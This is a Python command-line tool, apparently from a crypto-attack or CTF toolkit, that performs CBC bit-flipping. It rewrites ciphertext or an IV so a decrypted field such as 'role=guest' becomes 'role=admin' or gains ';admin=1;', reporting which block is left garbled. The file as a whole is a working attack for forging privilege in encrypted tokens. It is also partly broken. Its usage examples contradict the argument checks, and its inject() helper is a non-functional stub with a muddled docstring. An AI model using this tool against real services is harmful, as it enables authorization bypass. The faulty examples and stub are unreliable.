#!/usr/bin/env python3
"""cbc_bitflip.py -- CBC bit-flipping edit arithmetic.

CBC decrypts P[i] = D(C[i]) xor C[i-1]: flip bytes in block i-1 and the
plaintext of block i changes by the same xor, while block i-1 becomes
garbage. To turn a known plaintext into a wanted one at block i,
xor that delta into the PREVIOUS ciphertext block (or the IV for
block 0). Given the original blob and the edits, emit the modified
ciphertext to send back.

  python3 tools/cbc_bitflip.py --ct <hex> --known "user=0;role=guest" \
      --want "role=admin" --at 21          # byte offset in plaintext
  python3 tools/cbc_bitflip.py --iv <hex> --inject ";admin=1;" --at 8
  python3 tools/cbc_bitflip.py --selftest

--at is the plaintext byte offset where the wanted bytes go; the tool
computes which ciphertext block carries the patch (block boundary =
16). The corrupted neighbour block is named so the edit is honest --
if the app rejects the garbled block the position has to move into the
first block and the IV carries the patch instead.
"""
import argparse
import json
import struct
import sys

BS = 16


def patch(ct, at, delta):
    """Apply xor delta at plaintext offset `at` -> patch sits in ct[at-BS:at)."""
    if at < BS:
        raise ValueError("offset <16: patch would land in the IV; "
                         "pass it as --iv and use --inject instead")
    out = bytearray(ct)
    seg = at - BS
    for i, b in enumerate(delta):
        if seg + i < 0 or seg + i >= len(out):
            raise ValueError("patch falls outside the ciphertext")
        out[seg + i] ^= b
    return bytes(out)


def inject(iv, want):
    """Craft an IV so block-0 plaintext == want (needs D(C0) known? NO:
    CBC bit-flip on block 0 only works when the server echoes P0 or the
    known original P0 is known -- delta = known ^ want applied to IV).
    """
    return iv


def _selftest():
    known = b"A" * 16 + b"role=guest;uid=" + b"B" * 16
    want = b"role=admin;uid"
    delta = bytes(k ^ w for k, w in
                  zip(known[16:16 + len(want)], want))
    ct = bytes(range(64))
    mod = patch(ct, 16, delta)
    # the patch lands in the PREVIOUS block: P1 becomes want
    for i in range(len(delta)):
        assert mod[i] == ct[i] ^ delta[i], (i, mod[i], ct[i])
    assert mod[len(delta):16] == ct[len(delta):16]
    assert mod[16:] == ct[16:]
    print("cbc_bitflip selftest: ok")


def main():
    ap = argparse.ArgumentParser(description="CBC bit-flip arithmetic")
    ap.add_argument("--ct", help="ciphertext hex (block-aligned)")
    ap.add_argument("--iv", help="iv hex (block 0 edits)")
    ap.add_argument("--known", help="original plaintext bytes at --at")
    ap.add_argument("--want", help="wanted plaintext bytes at --at")
    ap.add_argument("--inject", help="bytes wanted in block 0 (IV patch)")
    ap.add_argument("--at", type=int, help="plaintext byte offset")
    ap.add_argument("--selftest", action="store_true")
    a = ap.parse_args()
    if a.selftest:
        return _selftest()
    if a.inject is not None:
        if not a.iv or not a.known:
            ap.error("--inject needs --iv and --known (original block-0 pt)")
        iv = bytes.fromhex(a.iv)
        want = a.inject.encode()
        known = a.known.encode()[:len(want)]
        if len(known) < len(want):
            ap.error("--known shorter than --inject")
        delta = bytes(k ^ w for k, w in zip(known, want))
        new_iv = bytes(iv[i] ^ (delta[i] if i < len(delta) else 0)
                       for i in range(len(iv)))
        print(json.dumps({"iv_hex": new_iv.hex(),
                          "block0_pt": a.inject}))
        return
    if not (a.ct and a.known and a.want and a.at is not None):
        ap.error("need --ct --known --want --at, or --iv/--inject/--known")
    ct = bytes.fromhex(a.ct)
    known, want = a.known.encode(), a.want.encode()
    if len(known) != len(want):
        ap.error("--known and --want must be the same length")
    delta = bytes(k ^ w for k, w in zip(known, want))
    try:
        mod = patch(ct, a.at, delta)
    except ValueError as exc:
        print(json.dumps({"error": str(exc)}))
        return 1
    blk = a.at // BS
    print(json.dumps({"patched_ct_hex": mod.hex(),
                      "patched_block": blk,
                      "corrupted_block": blk - 1,
                      "note": "block %d plaintext is now %r; block %d "
                              "decrypts to garbage" % (blk, a.want, blk - 1)}))


if __name__ == "__main__":
    raise SystemExit(main())
